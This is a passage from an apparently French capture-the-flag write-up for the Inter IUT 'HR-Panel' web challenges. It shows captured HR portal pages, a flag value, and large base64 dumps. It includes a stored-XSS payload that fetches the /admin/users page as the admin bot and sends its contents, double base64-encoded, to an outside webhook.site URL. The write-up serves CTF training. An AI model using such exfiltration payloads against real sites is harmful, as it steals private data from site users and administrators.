rYVhZK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQR1JwZGlCamJHRnpjejBpWTI5c0xYTnRMVFFpUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHTnNZWE56UFNKallYSmtJaUJ6ZEhsc1pUMGlZbUZqYTJkeWIzVnVaQzFqYjJ4dmNqb2dJelV5T1dKak1Ec2lQZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRHhrYVhZZ1kyeGhjM005SW1OaGNtUXRZbTlrZVNJK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThhRFVnWTJ4aGMzTTlJbU5oY21RdGRHbDBiR1VpUGtOeVpXRjBaU0JJVWlCeVpYRjFaWE4wY3lBb1FrVlVRU0JXUlZKVFNVOU9LVHd2YURVK0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThjQ0JqYkdGemN6MGlZMkZ5WkMxMFpYaDBJajQ4WW5JK1BHSjFkSFJ2YmlCamJHRnpjejBpWW5SdUlHSjBiaTF3Y21sdFlYSjVJaUJ2Ym1Oc2FXTnJQU0prYjJOMWJXVnVkQzVzYjJOaGRHbHZiajBuTDNObGNuWnBZMlZ6TDNKbGNYVmxjM1J6SnlJK1FXTmpaWE56UEM5aWRYUjBiMjQrUEM5d1Bnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4TDJScGRqNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4TDJScGRqNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQSEFnWTJ4aGMzTTlJbXhsWVdRaUlITjBlV3hsUFNKamIyeHZjam9nWW14aFkyczdJajVEVkVaSlZWUjdZV0kxTXpBMU16WmtOVEJrTURkbVptUTBNamxoTldaa1kyVmlPVFJqTlRBek1qSmlaREF4Wm1ZM01UZzFNek16TW1OaVpHSTFZVGczT1dFMU1EYzBNbjA4TDNBK0NpQWdJQ0FnSUNBZ0lDQWdJRHd2WkdsMlBnb2dJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdQQzlrYVhZK0Nqd3ZaR2wyUGdvOFpHbDJJR05zWVhOelBTSm1hWGhsWkMxaWIzUjBiMjBnZEdWNGRDMWpaVzUwWlhJaVBnb2dJQ0FnSUNBOGNDQnpkSGxzWlQwaVkyOXNiM0k2SUNNMU1qbGlZekE3SWo1SmJuUmxjaUJKVlZRZ1NGSWdVMlZ5ZG1salpYTWdWakV1TVMwNFBDOXdQZ284TDJScGRqNEtQQzlpYjJSNVBnbzhMMmgwYld3Kw==
+</code></pre></div>
+</details>
+
+<details>
+	<summary>Page /services</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE HTML&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Inter IUT - Human Resources<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&#34;</span> <span class="na">integrity</span><span class="o">=</span><span class="s">&#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&#34;</span> <span class="na">crossorigin</span><span class="o">=</span><span class="s">&#34;anonymous&#34;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://code.jquery.com/jquery-3.3.1.slim.min.js&#34;</span> <span class="na">integrity</span><span class="o">=</span><span class="s">&#34;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&#34;</span> <span class="na">crossorigin</span><span class="o">=</span><span class="s">&#34;anonymous&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&#34;</span> <span class="na">integrity</span><span class="o">=</span><span class="s">&#34;sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1&#34;</span> <span class="na">crossorigin</span><span class="o">=</span><span class="s">&#34;anonymous&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&#34;</span> <span class="na">integrity</span><span class="o">=</span><span class="s">&#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&#34;</span> <span class="na">crossorigin</span><span class="o">=</span><span class="s">&#34;anonymous&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/assets/css/form.css&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">nav</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;navbar navbar-expand-lg navbar-light bg-ligh&#34;</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;navbar-brand&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/&#34;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;/assets/Images/logo.png&#34;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;45&#34;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;40&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;d-inline-block align-top&#34;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>
+    Inter IUT
+  <span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;collapse navbar-collapse&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;navbarNavAltMarkup&#34;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;navbar-nav&#34;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/&#34;</span><span class="p">&gt;</span>Home<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/admin/users&#34;</span><span class="p">&gt;</span>Admin<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link active&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/services&#34;</span><span class="p">&gt;</span>Services  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;sr-only&#34;</span><span class="p">&gt;</span>(current)<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/contact&#34;</span><span class="p">&gt;</span>Contact<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/me&#34;</span><span class="p">&gt;</span>My account<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>  
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/logout&#34;</span><span class="p">&gt;</span>Logout<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">nav</span><span class="p">&gt;</span>
+    
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;container&#34;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;row&#34;</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col text-center&#34;</span><span class="p">&gt;</span>
+                <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;lead&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;margin-top: 20px; color: black;&#34;</span><span class="p">&gt;</span>
+                    Hello rh_admin_service, which services would you like to use?                <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>                
+                <span class="p">&lt;</span><span class="nt">hr</span><span class="p">/&gt;</span>
+                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;row&#34;</span><span class="p">&gt;</span>
+                    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-sm-4&#34;</span><span class="p">&gt;</span>
+                      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;background-color: #529bc0;&#34;</span><span class="p">&gt;</span>
+                        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card-body&#34;</span><span class="p">&gt;</span>
+                          <span class="p">&lt;</span><span class="nt">h5</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card-title&#34;</span><span class="p">&gt;</span>Access my pay slips<span class="p">&lt;/</span><span class="nt">h5</span><span class="p">&gt;</span>
+                          <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card-text&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-primary&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;document.location=&#39;/services/slips&#39;&#34;</span><span class="p">&gt;</span>Access<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+                        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+                      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+                    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+                    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-sm-4&#34;</span><span class="p">&gt;</span>
+                      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;background-color: #529bc0;&#34;</span><span class="p">&gt;</span>
+                        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card-body&#34;</span><span class="p">&gt;</span>
+                          <span class="p">&lt;</span><span class="nt">h5</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card-title&#34;</span><span class="p">&gt;</span>Manage my vacations<span class="p">&lt;/</span><span class="nt">h5</span><span class="p">&gt;</span>
+                          <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card-text&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-primary&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;document.location=&#39;/services/vacations&#39;&#34;</span><span class="p">&gt;</span>Access<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+                        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+                      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+                    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+                    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-sm-4&#34;</span><span class="p">&gt;</span>
+                        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;background-color: #529bc0;&#34;</span><span class="p">&gt;</span>
+                          <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card-body&#34;</span><span class="p">&gt;</span>
+                            <span class="p">&lt;</span><span class="nt">h5</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card-title&#34;</span><span class="p">&gt;</span>Create HR requests (BETA VERSION)<span class="p">&lt;/</span><span class="nt">h5</span><span class="p">&gt;</span>
+                            <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;card-text&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-primary&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;document.location=&#39;/services/requests&#39;&#34;</span><span class="p">&gt;</span>Access<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+                          <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+                        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+                    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+                  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;lead&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;color: black;&#34;</span><span class="p">&gt;</span>CTFIUT{ab530536d50d07ffd429a5fdceb94c50322bd01ff71853332cbdb5a879a50742}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;fixed-bottom text-center&#34;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">p</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;color: #529bc0;&#34;</span><span class="p">&gt;</span>Inter IUT HR Services V1.1-8<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</details>
+
+<p>Comme vous pouvez le constater, nous observons une ligne intéressante en bas de la page :</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;lead&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;color: black;&#34;</span><span class="p">&gt;</span>CTFIUT{ab530536d50d07ffd429a5fdceb94c50322bd01ff71853332cbdb5a879a50742}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</code></pre></div><p><strong>FLAG 1 : CTFIUT{ab530536d50d07ffd429a5fdceb94c50322bd01ff71853332cbdb5a879a50742}</strong></p>
+<h1 id="hr-panel-2---200pts">HR-Panel 2 - 200pts</h1>
+<p><img src="/p/inter-iut-hr-panel-1-2-3/hrpanel2.png"
+	width="496"
+	height="429"
+	srcset="/p/inter-iut-hr-panel-1-2-3/hrpanel2_hu2bfdf062d0f81d7002aa331df2b4473b_32985_480x0_resize_box_2.png 480w, /p/inter-iut-hr-panel-1-2-3/hrpanel2_hu2bfdf062d0f81d7002aa331df2b4473b_32985_1024x0_resize_box_2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="115"
+		data-flex-basis="277px"
+	
+></p>
+<p>En regardant attentivement dans la page que nous avons obtenue précédemment, on observe que ce bot à accès a une fonctionnalité supplémentaire :</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;nav-item nav-link&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/admin/users&#34;</span><span class="p">&gt;</span>Admin<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div><p>Procédons alors à la même méthode que précédemment et récupérons le contenu de cette page avec la payload suivante :</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+  <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;/admin/users&#39;</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
+  <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s2">&#34;https://webhook.site/4d294d0a-3486-4685-8918-8b55b85134bd/?content=&#34;</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)));</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><p>Voici le résultat :</p>
+<details>
+	<summary>Page /admin/users double encodé en base64</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">UENGRVQwTlVXVkJGSUVoVVRVdytDanhvWldGa1Bnb2dJQ0FnUEhScGRHeGxQa2x1ZEdWeUlFbFZWQ0F0SUVoMWJXRnVJRkpsYzI5MWNtTmxjend2ZEdsMGJHVStDaUFnSUNBOGJXVjBZU0JqYUdGeWMyVjBQU0pWVkVZdE9DSStDaUFnSUNBOGJHbHVheUJ5Wld3OUluTjBlV3hsYzJobFpYUWlJR2h5WldZOUltaDBkSEJ6T2k4dmMzUmhZMnR3WVhSb0xtSnZiM1J6ZEhKaGNHTmtiaTVqYjIwdlltOXZkSE4wY21Gd0x6UXVNeTR4TDJOemN5OWliMjkwYzNSeVlYQXViV2x1TG1OemN5SWdhVzUwWldkeWFYUjVQU0p6YUdFek9EUXRaMmRQZVZJd2FWaERZazFSZGpOWWFYQnRZVE0wVFVRclpFZ3ZNV1pSTnpnMEwybzJZMWt2YVVwVVVWVlBhR05YY2pkNE9VcDJiMUo0VkRKTlduY3hWQ0lnWTNKdmMzTnZjbWxuYVc0OUltRnViMjU1Ylc5MWN5SStDaUFnSUNBOGMyTnlhWEIwSUhOeVl6MGlhSFIwY0hNNkx5OWpiMlJsTG1weGRXVnllUzVqYjIwdmFuRjFaWEo1TFRNdU15NHhMbk5zYVcwdWJXbHVMbXB6SWlCcGJuUmxaM0pwZEhrOUluTm9ZVE00TkMxeE9Ha3ZXQ3M1TmpWRWVrOHdjbFEzWVdKTE5ERktVM1JSU1VGeFZtZFNWbnB3WW5wdk5YTnRXRXR3TkZsbVVuWklLemhoWW5SVVJURlFhVFpxYVhwdklpQmpjbTl6YzI5eWFXZHBiajBpWVc1dmJubHRiM1Z6SWo0OEwzTmpjbWx3ZEQ0S0lDQWdJRHh6WTNKcGNIUWdjM0pqUFNKb2RIUndjem92TDJOa2JtcHpMbU5zYjNWa1pteGhjbVV1WTI5dEwyRnFZWGd2YkdsaWN5OXdiM0J3WlhJdWFuTXZNUzR4TkM0M0wzVnRaQzl3YjNCd1pYSXViV2x1TG1weklpQnBiblJsWjNKcGRIazlJbk5vWVRNNE5DMVZUekpsVkRCRGNFaHhaRk5LVVRab1NuUjVOVXRXY0doMFVHaDZWMm81VjA4eFkyeElWRTFIWVROS1JGcDNjbTVSY1RSelJqZzJaRWxJVGtSNk1GY3hJaUJqY205emMyOXlhV2RwYmowaVlXNXZibmx0YjNWeklqNDhMM05qY21sd2RENEtJQ0FnSUR4elkzSnBjSFFnYzNKalBTSm9kSFJ3Y3pvdkwzTjBZV05yY0dGMGFDNWliMjkwYzNSeVlYQmpaRzR1WTI5dEwySnZiM1J6ZEhKaGNDODBMak11TVM5cWN5OWliMjkwYzNSeVlYQXViV2x1TG1weklpQnBiblJsWjNKcGRIazlJbk5vWVRNNE5DMUthbE50Vm1kNVpEQndNM0JZUWpGeVVtbGlXbFZCV1c5SlNYazJUM0pSTmxaeWFrbEZZVVptTDI1S1IzcEplRVpFYzJZMGVEQjRTVTByUWpBM2FsSk5JaUJqY205emMyOXlhV2RwYmowaVlXNXZibmx0YjNWeklqNDhMM05qY21sd2RENEtQQzlvWldGa1BnbzhZbTlrZVQ0OGJHbHVheUJ5Wld3OUluTjBlV3hsYzJobFpYUWlJR2h5WldZOUlpOWhjM05sZEhNdlkzTnpMMlp2Y20wdVkzTnpJajRLUEc1aGRpQmpiR0Z6Y3owaWJtRjJZbUZ5SUc1aGRtSmhjaTFsZUhCaGJtUXRiR2NnYm1GMlltRnlMV3hwWjJoMElHSm5MV3hwWjJnaVBnb2dJRHhoSUdOc1lYTnpQU0p1WVhaaVlYSXRZbkpoYm1RaUlHaHlaV1k5SWk4aVBnb2dJQ0FnUEdsdFp5QnpjbU05SWk5aGMzTmxkSE12U1cxaFoyVnpMMnh2WjI4dWNHNW5JaUIzYVdSMGFEMGlORFVpSUdobGFXZG9kRDBpTkRBaUlHTnNZWE56UFNKa0xXbHViR2x1WlMxaWJHOWpheUJoYkdsbmJpMTBiM0FpSUdGc2REMGlJajRLSUNBZ0lFbHVkR1Z5SUVsVlZBb2dJRHd2WVQ0S0lDQThaR2wySUdOc1lYTnpQU0pqYjJ4c1lYQnpaU0J1WVhaaVlYSXRZMjlzYkdGd2MyVWlJR2xrUFNKdVlYWmlZWEpPWVhaQmJIUk5ZWEpyZFhBaVBnb2dJQ0FnUEdScGRpQmpiR0Z6Y3owaWJtRjJZbUZ5TFc1aGRpSStDaUFnSUNBZ0lDQWdQR0VnWTJ4aGMzTTlJbTVoZGkxcGRHVnRJRzVoZGkxc2FXNXJJaUJvY21WbVBTSXZJajVJYjIxbFBDOWhQZ29nSUNBZ0lDQWdJRHhoSUdOc1lYTnpQU0p1WVhZdGFYUmxiU0J1WVhZdGJHbHVheUJoWTNScGRtVWlJR2h5WldZOUlpOWhaRzFwYmk5MWMyVnljeUkrUVdSdGFXNGdQSE53WVc0Z1kyeGhjM005SW5OeUxXOXViSGtpUGloamRYSnlaVzUwS1R3dmMzQmhiajQ4TDJFK0lDQWdJQ0FnSUNBOFlTQmpiR0Z6Y3owaWJtRjJMV2wwWlcwZ2JtRjJMV3hwYm1zaUlHaHlaV1k5SWk5elpYSjJhV05sY3lJK1UyVnlkbWxqWlhNOEwyRStDaUFnSUNBZ0lDQWdQR0VnWTJ4aGMzTTlJbTVoZGkxcGRHVnRJRzVoZGkxc2FXNXJJaUJvY21WbVBTSXZZMjl1ZEdGamRDSStRMjl1ZEdGamREd3ZZVDRLSUNBZ0lDQWdJQ0E4WVNCamJHRnpjejBpYm1GMkxXbDBaVzBnYm1GMkxXeHBibXNpSUdoeVpXWTlJaTl0WlNJK1RYa2dZV05qYjNWdWREd3ZZVDRnSUFvZ0lDQWdJQ0FnSUR4aElHTnNZWE56UFNKdVlYWXRhWFJsYlNCdVlYWXRiR2x1YXlJZ2FISmxaajBpTDJ4dloyOTFkQ0krVEc5bmIzVjBQQzloUGdvZ0lDQWdQQzlrYVhZK0NpQWdQQzlrYVhZK0Nqd3ZibUYyUGdvOFpHbDJJR05zWVhOelBTSmpiMjUwWVdsdVpYSWlQZ29nSUNBZ1BHUnBkaUJqYkdGemN6MGljbTkzSWo0S0lDQWdJQ0FnSUNBOFpHbDJJR05zWVhOelBTSmpiMndnZEdWNGRDMWpaVzUwWlhJaVBnb2dJQ0FnSUNBZ0lDQWdJQ0E4WkdsMklHbGtQU0ptYjNKdElqNGdDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThjQ0JqYkdGemN6MGliR1ZoWkNJZ2MzUjViR1U5SW1OdmJHOXlPaUFqTlRJNVltTXdPeUkrVjJWc1kyOXRaU0JCWkcxcGJpQWhJRmx2ZFNCallXNGdabWxzYkNCdmRYUWdkR2hsSUdadmNtMGdZbVZzYjNjZ2RHOGdkbVZ5YVdaNUlHRWdkWE5sY2lkeklHRmpZMjkxYm5RdVBDOXdQZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeG1iM0p0SUcxbGRHaHZaRDBpVUU5VFZDSWdaVzVqZEhsd1pUMGliWFZzZEdsd1lYSjBMMlp2Y20wdFpHRjBZU0krQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1BHbHVjSFYwSUc1aGJXVTlJblZ6WlhKdVlXMWxJaUJ3YkdGalpXaHZiR1JsY2owaVdqRXROVEkyTFUxUklpQnphWHBsUFNJeU1DSWdjbVZ4ZFdseVpXUStQR0p5UGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeGlkWFIwYjI0Z2RIbHdaVDBpYzNWaWJXbDBJaUJqYkdGemN6MGlZblJ1SUdKMGJpMXdjbWx0WVhKNUlqNVdaWEpwWm5rZ2RHaHBjeUJoWTJOdmRXNTBQQzlpZFhSMGIyNCtDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThMMlp2Y20wK0NpQWdJQ0FnSUNBZ0lDQWdJRHd2WkdsMlBnb2dJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdQQzlrYVhZK0Nqd3ZaR2wyUGdvOFpHbDJJR05zWVhOelBTSm1hWGhsWkMxaWIzUjBiMjBnZEdWNGRDMWpaVzUwWlhJaVBnb2dJQ0FnSUNBOGNDQnpkSGxzWlQwaVkyOXNiM0k2SUNNMU1qbGlZekE3SWo1SmJuUmxjaUJKVlZRZ1NGSWdVMlZ5ZG1salpYTWdWakV1TVMwNFBDOXdQZ284TDJScGRqNEtQQzlpYjJSNVBnbzhMMmgwYld3Kw====
+</code></pre></div>
+</details>
+
+<details>
+	<summary>Page /admin/users</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE HTML&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Inter IUT - Human Resources<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
